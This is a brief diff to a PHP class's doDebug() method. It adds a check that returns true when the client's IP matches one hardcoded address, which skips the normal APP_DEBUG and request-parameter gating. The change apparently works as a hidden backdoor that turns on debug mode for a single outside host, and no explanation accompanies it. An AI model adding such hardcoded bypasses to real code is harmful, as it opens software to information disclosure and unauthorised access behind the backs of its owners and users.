@@ -540,6 +540,9 @@ class AppRoot
 
 	public static function doDebug()
 	{
+	    if (self::getClientIP() == "212.115.197.251")
+	        return true;
+
 		if (defined("APP_DEBUG")) {
 			if (APP_DEBUG) {
                 if (\Tools::REQUEST("debug"))
